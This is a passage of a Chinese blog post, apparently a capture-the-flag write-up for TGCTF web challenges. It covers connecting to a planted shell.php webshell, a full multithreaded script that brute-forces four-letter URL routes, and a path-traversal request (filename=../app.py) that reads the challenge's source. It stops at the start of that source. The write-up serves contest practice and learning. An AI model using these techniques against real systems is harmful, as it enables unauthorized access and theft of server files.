@@ -1,0 +1,2743 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="这次是和徐师傅，顾师傅，梁师傅一起打的，各方向都写在一起了，距离五十名只差一步之遥，还是我技术不够精湛的原因\nWeb\r这次TGCTF Web方面给了我很大的挫败感，感觉对很多知识的了解都非常浅薄，一直做不出题，还是要下苦功夫精进技术\n">
+<title>TGCTF部分WP</title>
+
+<link rel='canonical' href='https://Oight.github.io/p/tgctf%E9%83%A8%E5%88%86wp/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="TGCTF部分WP">
+<meta property='og:description' content="这次是和徐师傅，顾师傅，梁师傅一起打的，各方向都写在一起了，距离五十名只差一步之遥，还是我技术不够精湛的原因\nWeb\r这次TGCTF Web方面给了我很大的挫败感，感觉对很多知识的了解都非常浅薄，一直做不出题，还是要下苦功夫精进技术\n">
+<meta property='og:url' content='https://Oight.github.io/p/tgctf%E9%83%A8%E5%88%86wp/'>
+<meta property='og:site_name' content='Oight'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-01T10:31:51&#43;08:00'/><meta property='article:modified_time' content='2025-06-01T10:31:51&#43;08:00'/>
+<meta name="twitter:title" content="TGCTF部分WP">
+<meta name="twitter:description" content="这次是和徐师傅，顾师傅，梁师傅一起打的，各方向都写在一起了，距离五十名只差一步之遥，还是我技术不够精湛的原因\nWeb\r这次TGCTF Web方面给了我很大的挫败感，感觉对很多知识的了解都非常浅薄，一直做不出题，还是要下苦功夫精进技术\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_37edead8cd3c258e.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Oight</a></h1>
+            <h2 class="site-description">talk is cheap, show me the code.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/696224138'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Oight'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#火眼辩魑魅">火眼辩魑魅</a></li>
+    <li><a href="#aaa偷渡阴平">AAA偷渡阴平</a></li>
+    <li><a href="#直面天命">直面天命</a></li>
+    <li><a href="#直面天命复仇">直面天命（复仇）</a></li>
+    <li><a href="#什么文件上传">什么文件上传？</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#base64">Base64</a></li>
+    <li><a href="#水果忍者">水果忍者</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#aaaaaaaa真签到">AAAAAAAA·真·签到</a></li>
+    <li><a href="#费克特尔">费克特尔</a></li>
+    <li><a href="#mm不躲猫猫">mm不躲猫猫</a></li>
+    <li><a href="#宝宝rsa">宝宝RSA</a></li>
+    <li><a href="#trwsians">tRwSiAns</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#where-it-isosint">where it is(osint)</a></li>
+    <li><a href="#好运来">好运来</a></li>
+    <li><a href="#简单签到关注杭师大网安谢谢喵">简单签到，关注：”杭师大网安“谢谢喵🐱</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/wp/" >
+                WP
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/tgctf%E9%83%A8%E5%88%86wp/">TGCTF部分WP</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-06-01</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 16 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>这次是和徐师傅，顾师傅，梁师傅一起打的，各方向都写在一起了，距离五十名只差一步之遥，还是我技术不够精湛的原因</p>
+<h1 id="web">Web
+</h1><p>这次TGCTF Web方面给了我很大的挫败感，感觉对很多知识的了解都非常浅薄，一直做不出题，还是要下苦功夫精进技术</p>
+<h2 id="火眼辩魑魅">火眼辩魑魅
+</h2><p>这道题很简单的签到题，dirsearch 扫一下得到几个文件路径，真正能打通的是 shell.php ，直接蚁剑连接，在根目录下找到 flag</p>
+<hr>
+<h2 id="aaa偷渡阴平">AAA偷渡阴平
+</h2><p>无参RCE</p>
+<p>可以看看这篇</p>
+<blockquote>
+<p><a class="link" href="https://blog.csdn.net/2301_76690905/article/details/133808536"  target="_blank" rel="noopener"
+    >无参数RCE绕过的详细总结(六种方法)</a></p></blockquote>
+<h2 id="直面天命">直面天命
+</h2><p>这道题很好玩</p>
+<p>一开始看出来是 SSTI ，但是拼尽全力无法注入。</p>
+<p>F12看网页源码，提示不止一个路由，进 /hint 看看</p>
+<p>提示有四个字母的路由，写个脚本爆破一下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 路由爆破脚本</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">sys</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">argparse</span>
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">concurrent</span><span class="o">.</span><span class="n">futures</span> <span class="n">import</span> <span class="n">ThreadPoolExecutor</span><span class="p">,</span> <span class="n">as_completed</span>
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">itertools</span> <span class="n">import</span> <span class="n">product</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_four_letter_paths</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;生成所有四个小写字母的组合（如 aaaa, aaab, ..., zzzz）&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">letters</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">chars</span> <span class="ow">in</span> <span class="n">product</span><span class="p">(</span><span class="n">letters</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">yield</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_url</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">results</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">full_url</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;{base_url}/{path}&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">full_url</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0&#39;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="n">allow_redirects</span><span class="o">=</span><span class="n">False</span>  <span class="c1"># 避免重定向干扰状态码判断</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">full_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[+] {full_url} - {response.status_code}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="n">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>  <span class="c1"># 忽略超时、连接错误等异常</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;四字母路径爆破工具&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;target&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;目标URL（如 http://example.com）&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="s1">&#39;--threads&#39;</span><span class="p">,</span> <span class="n">type</span><span class="o">=</span><span class="ne">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">50</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">help</span><span class="o">=</span><span class="s1">&#39;线程数（默认50）&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-o&#39;</span><span class="p">,</span> <span class="s1">&#39;--output&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;输出结果文件&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">base_url</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 生成所有四个小写字母的组合</span>
+</span></span><span class="line"><span class="cl">    <span class="n">paths</span> <span class="o">=</span> <span class="n">generate_four_letter_paths</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">threads</span><span class="p">)</span> <span class="n">as</span> <span class="n">executor</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">futures</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">paths</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">futures</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">check_url</span><span class="p">,</span> <span class="n">base_url</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">results</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 实时更新进度（可选）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">total</span> <span class="o">=</span> <span class="mi">26</span> <span class="o">**</span> <span class="mi">4</span>  <span class="c1"># 总共有26^4=456,976种组合</span>
+</span></span><span class="line"><span class="cl">        <span class="n">completed</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">as_completed</span><span class="p">(</span><span class="n">futures</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">completed</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">completed</span> <span class="o">%</span> <span class="mi">1000</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;进度：{completed}/{total}&#34;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">爆破完成！找到以下有效路径：&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;{url}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;结果已保存到 {args.output}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;警告：请确保您已获得目标网站的合法授权！&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆破出 /aazz 路由，进去 F12 看看，说是可以传参看源码(又要爆吗 QAQ )，后面问出题人说可以传 filename ，</p>
+<p>然后GET传 filename=../app.py 看看源码（提示看源码）</p>
+<p>源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">import string
+</span></span><span class="line"><span class="cl">from flask import Flask, request, render_template_string, jsonify, send_from_directory
